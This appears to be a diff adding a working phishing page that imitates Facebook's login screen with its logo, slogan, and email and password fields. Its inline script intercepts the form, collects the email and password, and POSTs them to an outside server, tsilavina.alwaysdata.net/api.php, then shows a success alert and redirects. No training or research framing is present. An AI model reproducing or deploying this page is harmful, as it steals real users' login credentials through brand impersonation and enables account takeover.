@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">        
+    <link rel="stylesheet" href="default.css">
+    <link rel="stylesheet" href="style.css">
+    <script>
+
+            function sendData(event) {
+    event.preventDefault();  // Empêche la soumission du formulaire classique
+
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+
+    var data = {
+        email: email,
+        password: password
+    };
+
+    fetch('https://tsilavina.alwaysdata.net/api.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'  // Spécifie que le corps de la requête est du JSON
+        },
+        body: JSON.stringify(data)  // Convertit l'objet en une chaîne JSON
+    })
+    .then(response => response.json())  // Convertit la réponse en JSON
+    .then(result => {
+        console.log(result);  // Affiche la réponse du serveur dans la console
+        if (result.status === 'success') {
+            alert('Data inserted successfully');
+            window.location.href = 'index.html';
+        } else {
+            alert('Error: ' + result.message);
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);  // Affiche l'erreur dans la console
+        alert('An error occurred while sending the data.');
+    });
+}
+
+            
+            
+            
+    </script>
+</head>
+
+<body>
+    <div class="login">
+        <div class="container">
+            <div class="row">
+                <div class="col-7">
+                    <div class="align-center">
+                        <div class="content">
+                            <img src="img/fb.png" alt="">
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-5 col-xs-12">
+                    <div class="login-form">
+                        <!-- Le formulaire classique, mais avec un événement de soumission personnalisé -->
+                        <form onsubmit="sendData(event)">
+                            <input id="email" type="text" name="email" placeholder="Email address or phone number"><br>
+                            <input id="password" name="password" type="password" placeholder="Password"><br>
+                            <input id="login-btn" type="submit" value="Log In"><br>
+                            <a href="#">Forgotten password?</a><br>
+                            <button id="create-btn">Create New Account</button><br>
+                        </form>
+                    </div>
+                    <footer>
+                        <a href="#" 
+                        style="font-weight: bold;
+                        color: var(--black);
+                        text-decoration: none;">Create a Page</a> 
+                        for a celebrity, band or business.
+                    </footer>
+                </div>
+            </div>
+        </div>
+    </div>   
+</body>
+</html>
